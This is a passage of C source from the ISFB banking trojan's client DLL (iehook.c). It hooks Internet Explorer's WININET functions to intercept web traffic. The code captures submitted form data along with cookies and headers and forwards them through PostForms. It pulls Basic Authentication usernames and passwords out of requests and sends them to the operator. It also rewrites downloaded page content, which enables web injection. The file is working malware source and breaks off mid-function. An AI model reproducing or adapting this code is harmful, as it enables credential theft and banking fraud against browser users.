//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: iehook.c
// $Revision: 415 $
// $Date: 2014-11-25 12:04:59 +0300 (Вт, 25 ноя 2014) $
// description:
//	ISFB client DLL. IE-specific hooks.

#include "..\common\common.h"
#include "..\crm.h"
#include "parser.h"
#include "conf.h"
#include "pipes.h"
#include "http.h"
#include <DelayImp.h>
#include "transfer.h"

#define	IE_WAIT_REQUEST_TIMEOUT	5000	// milliseconds

// ----- Remote hooks -----------------------------------------------------------------------------------------------

// Hook fucntions predefinitions
BOOL WINAPI my_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
BOOL WINAPI my_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
BOOL WINAPI my_InternetReadFileExA(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
BOOL WINAPI my_InternetReadFileExW(HINTERNET hFile, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
BOOL WINAPI my_HttpSendRequestA(HINTERNET hRequest, LPSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL WINAPI my_HttpSendRequestW(HINTERNET hRequest, LPWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL WINAPI my_HttpSendRequestExA(HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
BOOL WINAPI my_HttpSendRequestExW(HINTERNET hRequest, LPINTERNET_BUFFERSW lpBuffersIn, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
BOOL WINAPI my_InternetCloseHandle(HINTERNET hInternet);
BOOL WINAPI my_InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
void CALLBACK my_InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength);

HINTERNET WINAPI my_InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUsername, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
HINTERNET WINAPI my_InternetConnectW(HINTERNET hInternet, LPWSTR lpszServerName, INTERNET_PORT nServerPort, LPWSTR lpszUsername, LPWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);

BOOL WINAPI my_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
BOOL WINAPI my_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

BOOL WINAPI my_HttpAddRequestHeadersA(HINTERNET hRequest, LPSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
BOOL WINAPI my_HttpAddRequestHeadersW(HINTERNET hRequest, LPWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);

HINTERNET WINAPI my_HttpOpenRequestW(HINTERNET hConnect, LPWSTR lpszVerb, LPWSTR lpszObjectName, LPWSTR lpszVersion, LPWSTR lpszReferer, LPWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);

INTERNET_STATUS_CALLBACK WINAPI my_InternetSetStatusCallback(HINTERNET hInternet, INTERNET_STATUS_CALLBACK lpfnInternetCallback);


// Hook structures
HOOK_FUNCTION hook_InternetReadFile		= {szWininet, szInternetReadFile, &my_InternetReadFile, NULL};
HOOK_FUNCTION hook_InternetWriteFile	= {szWininet, szInternetWriteFile, &my_InternetWriteFile, NULL};
HOOK_FUNCTION hook_InternetReadFileExA	= {szWininet, szInternetReadFileExA, &my_InternetReadFileExA, NULL};
HOOK_FUNCTION hook_InternetReadFileExW	= {szWininet, szInternetReadFileExW, &my_InternetReadFileExW, NULL};
HOOK_FUNCTION hook_HttpSendRequestA		= {szWininet, szHttpSendRequestA, &my_HttpSendRequestA, NULL};
HOOK_FUNCTION hook_HttpSendRequestW		= {szWininet, szHttpSendRequestW, &my_HttpSendRequestW, NULL};
HOOK_FUNCTION hook_InternetQueryDataAvailable = {szWininet, szInternetQueryDataAvailable, &my_InternetQueryDataAvailable, NULL};
HOOK_FUNCTION hook_InternetConnectA		= {szWininet, szInternetConnectA, &my_InternetConnectA, NULL};
HOOK_FUNCTION hook_InternetConnectW		= {szWininet, szInternetConnectW, &my_InternetConnectW, NULL};

HOOK_FUNCTION hook_HttpQueryInfoA		= {szWininet, szHttpQueryInfoA, &my_HttpQueryInfoA, NULL};
HOOK_FUNCTION hook_HttpQueryInfoW		= {szWininet, szHttpQueryInfoW, &my_HttpQueryInfoW, NULL};

HOOK_FUNCTION hook_HttpAddRequestHeadersA		= {szWininet, szHttpAddRequestHeadersA, &my_HttpAddRequestHeadersA, NULL};
HOOK_FUNCTION hook_HttpAddRequestHeadersW		= {szWininet, szHttpAddRequestHeadersW, &my_HttpAddRequestHeadersW, NULL};

#ifdef _IE_DISABLE_REDIRECT
HOOK_FUNCTION hook_HttpOpenRequestW		= {szWininet, szHttpOpenRequestW, &my_HttpOpenRequestW, NULL};
#endif


// Hook descriptors
static HOOK_DESCRIPTOR IeIatHooks[] = {
	DEFINE_HOOK(&hook_InternetReadFile, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetWriteFile, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetReadFileExA, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetReadFileExW, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpSendRequestA, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpSendRequestW, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpQueryInfoA, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpQueryInfoW, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpAddRequestHeadersA, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_HttpAddRequestHeadersW, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetConnectA, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetConnectW, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_InternetQueryDataAvailable, HF_TYPE_IAT | HF_PATCH_NAME),
#ifdef _IE_DISABLE_REDIRECT
	DEFINE_HOOK(&hook_HttpOpenRequestW, HF_TYPE_IAT | HF_PATCH_NAME),
#endif
};

static HOOK_DESCRIPTOR IeExportHooks[] = {
	DEFINE_HOOK(&hook_InternetReadFile, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetWriteFile, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetReadFileExA, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetReadFileExW, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpSendRequestA, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpSendRequestW, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpQueryInfoA, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpQueryInfoW, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpAddRequestHeadersA, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_HttpAddRequestHeadersW, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetConnectA, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetConnectW, HF_TYPE_EXPORT),
	DEFINE_HOOK(&hook_InternetQueryDataAvailable, HF_TYPE_EXPORT),
#ifdef _IE_DISABLE_REDIRECT
	DEFINE_HOOK(&hook_HttpOpenRequestW, HF_TYPE_EXPORT),
#endif
};


// ---- Functions -----------------------------------------------------------------------------------------------------------


//
//	Loads WININET.DLL and sets it's export and import hooks.	
//
WINERROR IeSetHooks(VOID)
{
	WINERROR Status = NO_ERROR;
	PHOOK_DESCRIPTOR ExportHooks, IatHooks;
	ULONG	NumberExportHooks, NumberIatHooks;

	if (LoadLibraryA(szWininet))
	{
		HRESULT Res;

		ExportHooks = (PHOOK_DESCRIPTOR)&IeExportHooks;
		IatHooks = (PHOOK_DESCRIPTOR)&IeIatHooks;
		NumberExportHooks = sizeof(IeExportHooks) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(IeExportHooks) / sizeof(HOOK_DESCRIPTOR);

		// Init our own WININET IAT entries now, before DLL export hooked.
		Res = __HrLoadAllImportsForDll(szWininetDll); // NOTE: Dll name is case sensitive here!
		ASSERT(Res == NO_ERROR);
	
		g_HandleTable->Flags |= TF_REUSE_HANDLE;
		Status = ParserHookImportExport(IatHooks, NumberIatHooks, ExportHooks, NumberExportHooks);
	}
	else
	{
		ASSERT(FALSE);
		Status = ERROR_MOD_NOT_FOUND;
	}

	return(Status);
}



//
//	Checks if the Internet status callback set not by us and replaces it by our own function.
//
BOOL SetCallback(
	HANDLE hRequest,
	PHANDLE_CONTEXT	Ctx
	)
{
	BOOL	Ret = FALSE;
	PVOID	Callback = NULL;
	ULONG	cLen = sizeof(PVOID);

	if (InternetQueryOption(hRequest, INTERNET_OPTION_CALLBACK, &Callback, &cLen))
	{
		if (Callback != &my_InternetStatusCallback)
		{
			Ctx->Callback = Callback;
			ASSERT((LONG_PTR)Ctx->Callback >= 0);	// User-mode address
			if (InternetSetStatusCallback(hRequest, &my_InternetStatusCallback) == Callback)
				Ret = TRUE;
		}
	}
	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Queries specified handle for the user Parser string and if successfull activates the Parser.
//  This function used only once, at browser startup.
//
static VOID IeActivateParser(HINTERNET hInternet)
{
	ULONG bSize = 0;
	InternetQueryOption(hInternet, INTERNET_OPTION_USER_AGENT, NULL, &bSize);
	if (bSize)
	{
		LPTSTR	AgentStr;
		if (AgentStr = (LPTSTR)hAlloc(bSize))
		{
			if (InternetQueryOption(hInternet, INTERNET_OPTION_USER_AGENT, AgentStr, &bSize))
				ActivateParser(AgentStr);
			hFree(AgentStr);
		}
	}
}


static VOID IeReplaceStream(HINTERNET hRequest, PHANDLE_CONTEXT Ctx)
{
	ULONG	Written, bLen = 0;
	LPSTR	FileName, Buffer;
	HANDLE	hFile;

	ASSERT(Ctx->Flags & CF_CONTENT);
	ASSERT(Ctx->Url);

	ConfigProcessStream(Ctx->pStream, NULL, Ctx->Url, (StrStrI(Ctx->Url, szHttps) == Ctx->Url) ? TRUE : FALSE, Ctx->tCtx);		

	InternetQueryOption(hRequest, INTERNET_OPTION_DATAFILE_NAME, NULL, &bLen);
	if ((bLen) && (FileName = hAlloc(bLen + 1)))
	{
		if (InternetQueryOption(hRequest, INTERNET_OPTION_DATAFILE_NAME, FileName, &bLen))
		{
			FileName[bLen] = 0;
			hFile =  CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0);
			
			if (hFile != INVALID_HANDLE_VALUE)
			{
				if (Buffer = hAlloc(MAX_CONTENT_BUFFER_SIZE))
				{						
					StreamGotoBegin(Ctx->pStream);
					do
					{
						bLen = 0;
						CoInvoke(Ctx->pStream, Read, Buffer, MAX_CONTENT_BUFFER_SIZE, &bLen);

						if (bLen == 0)
							break;
	
						if (!WriteFile(hFile, Buffer, bLen, &Written, NULL) || (Written != bLen))
							break;
					} while(bLen == MAX_CONTENT_BUFFER_SIZE);

					hFree(Buffer);
				}	// if (Buffer = hAlloc(MAX_CONTENT_BUFFER_SIZE))
				CloseHandle(hFile);
			}	// if (hFile != INVALID_HANDLE_VALUE)
		}	// if (InternetQueryOption(
		hFree(FileName);
	}	// if ((bLen) && (FileName = hAlloc(bLen)))

}


//
//	Reads the speceifed reaquest's page synchronuosly.
//	Stores the page content into Ctx->pStream stream.
//
VOID ReadPageSync(
	PHANDLE_CONTEXT Ctx, 
	HINTERNET		hRequest
	)
{
	ULONG	bRead = 0;
	LPVOID	pMem = NULL;
	WINERROR Status;
	ULONG	Timeout = INFINITE;

	// There's a bug within WININET on XP:
	//	sometimes call to InternetReadFile() doesn't return INTERNET_STATUS_REQUEST_COMPLETE.
	//	To solve this we do not wait infinite on page load but use IE_WAIT_REQUEST_TIMEOUT instead.
	if (LOBYTE(LOWORD(g_SystemVersion)) <= 5)
		Timeout = IE_WAIT_REQUEST_TIMEOUT;

	if (pMem = hAlloc(MAX_CONTENT_BUFFER_SIZE))
	{
		do
		{
			if (!InternetReadFile(hRequest, pMem, MAX_CONTENT_BUFFER_SIZE, &bRead))
			{
				if (GetLastError() != ERROR_IO_PENDING)
				{
					Ctx->Status = ERROR_WHILE_LOADING;
					break;
				}

				Status = WaitForSingleObject(Ctx->AsyncEvent, Timeout);
				
				if (Status == WAIT_TIMEOUT)
				{
					ASSERT(LOBYTE(LOWORD(g_SystemVersion)) <= 5);
					break;
				}

				if (Status != WAIT_OBJECT_0 || Ctx->Status == ERROR_WHILE_LOADING)
				{			
					Ctx->Status = ERROR_WHILE_LOADING;
					break;
				}
			}

			if (bRead)
				CoInvoke(Ctx->pStream, Write, pMem, bRead, NULL);
			else
			{
				// InternetReadFile successed but number of bytes read is 0.
				// This means no more data avaliable to read.
				Ctx->Status = LOADING_COMPLETE;
				break;
			}

		} while (TRUE);

		hFree(pMem);
	}	// if (pMem = hAlloc(MAX_CONTENT_BUFFER_SIZE))
	else
		Ctx->Status = ERROR_WHILE_LOADING;

}


static VOID GetPageEx(PHANDLE_CONTEXT Ctx, HINTERNET hFile, DWORD_PTR dwContext)
{
	INTERNET_BUFFERS Buffers = {0};
	LPVOID pMem = hAlloc(MAX_CONTENT_BUFFER_SIZE);

	if (pMem)
	{
		Buffers.dwStructSize = sizeof(INTERNET_BUFFERS);
		Buffers.lpvBuffer = pMem;
		
		do
		{
			Buffers.dwBufferLength = MAX_CONTENT_BUFFER_SIZE;

			if (InternetReadFileEx(hFile, &Buffers, IRF_SYNC | IRF_NO_WAIT, dwContext))
			{
				ASSERT(Buffers.dwBufferLength <= MAX_CONTENT_BUFFER_SIZE);
				ASSERT(Buffers.dwBufferTotal <= MAX_CONTENT_BUFFER_SIZE);

				if (Buffers.dwBufferLength == 0)
				{
					Ctx->Status = LOADING_COMPLETE;
					break;
				}
				else
					CoInvoke(Ctx->pStream, Write, pMem, Buffers.dwBufferLength, NULL);

			}	// if (InternetReadFileEx(
			else
			{
				if (GetLastError() != ERROR_IO_PENDING)
					Ctx->Status = ERROR_WHILE_LOADING;
				break;
			}	// else // if (InternetReadFileEx(
		}while (TRUE);

		hFree(pMem);
	}	// 	if (pMem)
}


//
//	Checks the specified request if it contains supported content type.
//
static BOOL IeCheckContentType(
	HANDLE hRequest
	)
{
	BOOL	Ret	= FALSE;
	ULONG	bRead = 0;
	LPTSTR	Content;

	HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_TYPE, NULL, &bRead, NULL);

	if (Content = hAlloc(bRead + sizeof(_TCHAR)))
	{
		if (HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_TYPE, Content, &bRead, NULL))
		{
			Content[bRead] = 0;
			Ret = CheckContentType(Content);
		}
		hFree(Content);
	}	// if (Content = hAlloc(bRead))

	return(Ret);
}

//
//	Loads whole page content and processes replacements.
//
static VOID GetPageContent(PHANDLE_CONTEXT Ctx, HINTERNET hFile)
{
	if (Ctx->Status != LOADING_COMPLETE && Ctx->Status != ERROR_WHILE_LOADING && !StreamAvaliable(Ctx->pStream))
	{
		StreamClear(Ctx->pStream);

		Ctx->Status = DOWNLOADING;
		ReadPageSync(Ctx, hFile);

		if (Ctx->Flags & CF_CONTENT)
			IeReplaceStream(hFile, Ctx);

		StreamGotoBegin(Ctx->pStream);
	}	// if (Ctx->Status != LOADING_COMPLETE && Ctx->Status != ERROR_WHILE_LOADING)
}


//
//	Performs handle check and returns handle-associated context.
//
static PHANDLE_CONTEXT IeGetContext(HANDLE	hRequest)
{
	PHANDLE_CONTEXT Ctx = NULL;

	if (Ctx = FindHandle(hRequest))
	{
		if (!(Ctx->Flags & (CF_SKIP | CF_CONTENT)))
		{
			Ctx->Flags |= CF_SKIP;

			// Checking content type
			if ((Ctx->Flags & CF_REPLACE) || IeCheckContentType(hRequest))
			{
				ULONG	bLen = 0;
				ASSERT(Ctx->Url == NULL);

				// Querying the URL
				InternetQueryOption(hRequest, INTERNET_OPTION_URL, NULL, &bLen);
				if ((bLen) && (Ctx->Url = hAlloc(bLen + sizeof(_TCHAR))))
				{
					if (InternetQueryOption(hRequest, INTERNET_OPTION_URL, Ctx->Url, &bLen))
					{
						Ctx->Url[bLen] = 0;
						Ctx->Flags |= CF_CONTENT;
						Ctx->Flags ^= CF_SKIP;
					}
					else
					{
						hFree(Ctx->Url);
						Ctx->Url = NULL;
					}
				}	// if ((bLen) && (Ctx->Url = hAlloc(bLen + sizeof(_TCHAR))))
			}	// if (IeCheckContentType(hFile))
		}	// if (!(Ctx->Flags & (CF_SKIP | CF_CONTENT)))

		if (Ctx->Flags & CF_SKIP)
		{
			ReleaseHandle(Ctx);
			Ctx = NULL;
		}
	}	// if (Ctx = FindHandle(hFile))

	return(Ctx);
}


//
//	Allocates a buffer and copies HTTP referer header value into it.
//
LPSTR	IeGetReferer(
	HINTERNET	hRequest
	)
{
	LPSTR	RefererPtr, pHeaders, pReferer = NULL;
	ULONG	Len;

	if (pHeaders = TaransferGetRequestHeaders(hRequest))
	{
		// Looking for the referer header
		if (RefererPtr = HttpFindHeaderA((LPSTR)pHeaders, szReferer, &Len))
		{
			// Allocating and copying the referer string
			if (pReferer = hAlloc(Len + sizeof(CHAR)))
			{
				memcpy(pReferer, RefererPtr, Len);
				pReferer[Len] = 0;
			}
		}
		hFree(pHeaders);
	}	// if (pHeaders = TaransferGetRequestHeaders(hRequest))

	return(pReferer);
}


//
//	Returns Cookie string for the specified URL.
//
LPTSTR IeGetCookie(
	LPTSTR pUrl
	)
{
	LPTSTR	pCookie = NULL;
	ULONG	Size = 0;

	InternetGetCookie(pUrl, NULL, NULL, &Size); 
	if (Size && (pCookie = hAlloc(Size + sizeof(_TCHAR))))
	{
		if (!InternetGetCookie(pUrl, NULL, pCookie, &Size))
		{
			hFree(pCookie);
			pCookie = NULL;
		}
		else
			pCookie[Size] = 0;
	}	// if (Size && (pCookie = AppAlloc(Size * sizeof(_TCHAR))))

	return(pCookie);
}


//
// Queries spesified request handle for a target URL, and sends specified data and URL to the active host.
//
static VOID	IeQueryUrlPostForms(
	HANDLE	hRequest,	// Request handle to query
	LPSTR	pHeaders,	// HTTP headers of the request
	PVOID	lpData,		// Form data
	ULONG	dwData		// Form data length (bytes)
	)
{
	BOOL bIsSsl = FALSE;

	if (dwData <= MAX_FORM_SIZE)
	{
		ULONG	dwBufLen = MAX_URL_LEN * sizeof(_TCHAR);
		LPTSTR	pUrl = (LPTSTR)hAlloc(dwBufLen);
		if (pUrl)
		{
			if (InternetQueryOption(hRequest, INTERNET_OPTION_URL, pUrl, &dwBufLen))
			{
				if (StrStrI(pUrl, szHttps) == pUrl)
					bIsSsl = TRUE;

				if ((g_ClientId.Plugins & PG_BIT_FORMS) || 
#ifdef _ALWAYS_HTTPS
					(bIsSsl)
#else
					(FALSE)
#endif
					)
				{
					LPSTR pCookie, pHeaders1 = NULL;

					if (!pHeaders)
						// No request headers specified, trying to get them from the request handle
						pHeaders = pHeaders1 = TaransferGetRequestHeaders(hRequest);

					if (ConfigCheckInitUrl(pUrl, NULL, bIsSsl, NULL) != URL_STATUS_POST_BLOCK)
					{
						pCookie = IeGetCookie(pUrl);

						PostForms(pUrl, pHeaders, pCookie, lpData, dwData, SEND_ID_FORM, TRUE);

						if (pCookie)
							hFree(pCookie);
					}

					if (pHeaders1)
						hFree(pHeaders1);
				}	// if ((g_ClientId.Plugins & PG_BIT_FORMS) || (StrStrI(pUrl, szHttps) == pUrl))
			}	// if (InternetQueryOption(hRequest, INTERNET_OPTION_URL, pUrl, &dwBufLen))
			hFree(pUrl);
		}	// if (pUrl)
	}	// if (dwData <= MAX_FORM_SIZE)
}


//
//	Checks if the specified handle associated with URL that has any submited action within the config.
//	Tries to extract and send basic authentication data if any.
//
static ULONG IeCheckURL(
	HANDLE	hRequest, 
	LPSTR	Referer,
	PVOID*	ptCtx
	)
{
	ULONG	Status = URL_STATUS_UNDEF;
	ULONG	bSize = 0;
	LPTSTR	Url, pUser = NULL, pPass = NULL, FmtStr = NULL;

	InternetQueryOption(hRequest, INTERNET_OPTION_URL, NULL, &bSize);

	if ((bSize) && (Url = hAlloc(bSize + sizeof(_TCHAR))))
	{
		if (InternetQueryOption(hRequest, INTERNET_OPTION_URL, Url, &bSize))
		{
			Url[bSize] = 0;
			Status = ConfigCheckInitUrl(Url, Referer, ((StrStrI(Url, szHttps) == Url) ? TRUE : FALSE), ptCtx);

			// Queryin the Basic Authentication data
			bSize = MAX_USER_LEN * sizeof(_TCHAR);

			do	// not a loop
			{
				if (!(pUser = (LPTSTR)hAlloc(bSize)))
					break;

				if (!(pPass = (LPTSTR)hAlloc(bSize)))
					break;

				if (!InternetQueryOption(hRequest, INTERNET_OPTION_USERNAME, pUser, &bSize) || pUser[0] == 0)
					break;

				bSize = MAX_USER_LEN * sizeof(_TCHAR);
				if (!InternetQueryOption(hRequest, INTERNET_OPTION_PASSWORD, pPass, &bSize) || pPass[0] == 0)
					break;

				FmtStr = hAlloc((cstrlen(szDateTimeFmt) + cstrlen(szBasicFmt) + lstrlen(Url) + MAX_USER_LEN + MAX_USER_LEN + 1) * sizeof(_TCHAR));

				if (FmtStr)
				{
					bSize = PsSupPrintDateTime(FmtStr, NULL, TRUE);
					bSize += wsprintf(FmtStr + bSize, szBasicFmt, Url, pUser, pPass);
#ifdef _SEND_FORMS
					ConfSendData(FmtStr, bSize, SEND_ID_AUTH, NULL, FALSE);
#else
					PipeSendCommand(CMD_STORE_AUTH, FmtStr, bSize, NULL);
#endif
					hFree(FmtStr);
				}

			} while(FALSE);

			if (pUser)
				hFree(pUser);
			if (pPass)
				hFree(pPass);

		}	// if (InternetQueryOption(hRequest, INTERNET_OPTION_URL, Url, &bSize))
		hFree(Url);
	}	// if ((bSize) && (Url = hAlloc(bSize + sizeof(_TCHAR))))

	return(Status);
}


//
//	Checks if the specified request handle should be processed, and adds it into the Handle Table.
//
static PHANDLE_CONTEXT IeCheckAddHandle(
	HANDLE	hRequest,	// Handle to HTTP request
	LPSTR	pReferer	// HTTP referer string
	)
{
	PHANDLE_CONTEXT	Ctx = NULL;
	PVOID	tCtx = NULL;
	ULONG	Status;

	if ((Status = IeCheckURL(hRequest, pReferer, &tCtx)) && Status != URL_STATUS_POST_BLOCK)
	{
		if (Ctx = AddHandle(hRequest))
		{
			if (Ctx->Flags & CF_IE)
			{
				// Handle seems to be reused
				StreamClear(Ctx->pStream);
				if (Ctx->Url)
					hFree(Ctx->Url);

				if (Ctx->tCtx)
				{
					TransferReleaseContext(Ctx->tCtx);
					hFree(Ctx->tCtx);
					Ctx->tCtx = NULL;
				}	// if (Ctx->tCtx)
			}	// if (Ctx->Flags & CF_IE)

			Ctx->tCtx = tCtx;
			Ctx->Flags = CF_IE;

			if (Status == URL_STATUS_REPLACE)
				Ctx->Flags |= CF_REPLACE;

			if (Status == URL_STATUS_BLOCK)
				Ctx->Status = REQUEST_BLOCKED;
			else
				Ctx->Status = UNKNOWN_STATUS;

			Ctx->Url = NULL;
		}
		else
		{
			ASSERT(FALSE);
		}
	}	// if (IeCheckURL(hRequest, tCtx))
	return(Ctx);
}


//
//	Obtains target URL and referer from the specified request handle and HTTP headers string.
//	Checks URL and referer and creates handle context if needed.
//	Adds "Accept-Encoding: identity" header.
//
static LPSTR IeCreateContextModifyHeadersA(
	HINTERNET			hRequest,
	LPSTR				lpszHeaders,
	DWORD				dwHeadersLength,
	LPSTR*				ppHeaders,
	PHANDLE_CONTEXT*	pCtx
	)
{
	LPSTR	NewHeaders = NULL, pHeaders = NULL, pReferer = NULL;
	ULONG	Len;
	CHAR	OldChar;
	PHANDLE_CONTEXT	Ctx = NULL;


	// Check if we already have a context for the specified handle
	if (!(Ctx = FindHandle(hRequest)))
	{
		if	(lpszHeaders)
		{
			if (dwHeadersLength == -1)
				Len = lstrlenA(lpszHeaders);
			else
				Len = dwHeadersLength;

			if (pHeaders = hAlloc(Len + sizeof(CHAR)))
			{
				memcpy(pHeaders, lpszHeaders, Len);
				pHeaders[Len] = 0;
			}
		}	// if	(lpszHeaders)
		else
			pHeaders = TaransferGetRequestHeaders(hRequest);

		if (pHeaders)
		{
			if (pReferer = HttpFindHeaderA(pHeaders, szReferer, &Len))
			{
				OldChar = pReferer[Len];
				pReferer[Len] = 0;
			}
		}	// if (pHeaders)

		if (ppHeaders)
			*ppHeaders = pHeaders;

		// Creating a context for the handle
		if (Ctx = IeCheckAddHandle(hRequest, pReferer))
			SetCallback(hRequest, Ctx);

		if (pReferer)
			pReferer[Len] = OldChar;
	}	// if (!(Ctx = IeGetContext(hRequest)))
	else
		ReleaseHandle(Ctx);

	if (Ctx)
	{
		if	((lpszHeaders) && (dwHeadersLength == -1))
			// Setting "Accept-Encoding: identity" header
			NewHeaders = HttpSetHeaderA(lpszHeaders, szAcceptEncoding, szIdentity, NULL);
	}

	if (pCtx)
		*pCtx = Ctx;

	return(NewHeaders);
}



static LPWSTR IeCreateContextModifyHeadersW(
	HINTERNET			hRequest,
	LPWSTR				lpszHeaders,
	DWORD				dwHeadersLength,
	LPSTR*				ppHeaders,
	PHANDLE_CONTEXT*	pCtx	
	)
{
	LPWSTR	NewHeaders = NULL;
	LPSTR	pHeaders = NULL, NewHeadersA;
	ULONG	Len;
	PHANDLE_CONTEXT	Ctx = NULL;

	if	((lpszHeaders) && (dwHeadersLength == -1))
	{
		Len = lstrlenW(lpszHeaders);

		if (pHeaders = hAlloc(Len + 1))
			wcstombs(pHeaders, lpszHeaders, Len + 1);
	}
	
	if (NewHeadersA = IeCreateContextModifyHeadersA(hRequest, pHeaders, dwHeadersLength, ppHeaders, &Ctx))
	{
		Len = lstrlenA(NewHeadersA);
		if (NewHeaders = hAlloc((Len + 1) * sizeof(WCHAR)))
			mbstowcs(NewHeaders, NewHeadersA, Len + 1);
		hFree(NewHeadersA);
	}

	if (pHeaders)
		hFree(pHeaders);

	if (pCtx)
		*pCtx = Ctx;

	return(NewHeaders);
}




// ------ My hook functions ------------------------------------------------------------------------------------------------

//
//	Common routine for InternetReadFileExA and InternetReadFileExW hooks.
//
static BOOL CommonInternetReadFileEx(
	HINTERNET			hFile, 
	LPINTERNET_BUFFERS	lpBuffersOut, 
	DWORD				dwFlags, 
	DWORD_PTR			dwContext, 
	BOOL				IsUnicode
	)
{
	BOOL Ret = FALSE;
	PHANDLE_CONTEXT	Ctx;

	if (Ctx = IeGetContext(hFile))
	{
		do	// not a loop
		{
			GetPageContent(Ctx, hFile);

			lpBuffersOut->dwBufferTotal = lpBuffersOut->dwBufferLength;
			if (CoInvoke(Ctx->pStream, Read, lpBuffersOut->lpvBuffer, lpBuffersOut->dwBufferLength, &lpBuffersOut->dwBufferLength) == S_OK)
				Ret = TRUE;

		} while(FALSE);

		ReleaseHandle(Ctx);
	}
	else
	{
		if (IsUnicode)
			Ret = InternetReadFileExW(hFile, (LPINTERNET_BUFFERSW)lpBuffersOut, dwFlags, dwContext);
		else
			Ret = InternetReadFileExA(hFile, lpBuffersOut, dwFlags, dwContext);
	}

	return(Ret);
}


BOOL WINAPI my_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
{
	BOOL Ret = FALSE;

	ENTER_HOOK();

	if (Ret = InternetWriteFile(hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten))
	{
		if ((dwNumberOfBytesToWrite) && (lpBuffer))
			IeQueryUrlPostForms(hFile, NULL, (PVOID)lpBuffer, dwNumberOfBytesToWrite);
	}

	LEAVE_HOOK();

	return(Ret);
}


BOOL WINAPI my_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
	BOOL Ret = FALSE;
	PHANDLE_CONTEXT Ctx = NULL;

	ENTER_HOOK();

	*lpdwNumberOfBytesRead = 0;

	if (Ctx = IeGetContext(hFile))
	{
		GetPageContent(Ctx, hFile);
					
		if (CoInvoke(Ctx->pStream, Read, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead) == S_OK)
			Ret = TRUE;
	
		ReleaseHandle(Ctx);
	}
	else
		Ret = InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);

	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_InternetReadFileExA(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
	BOOL Ret;
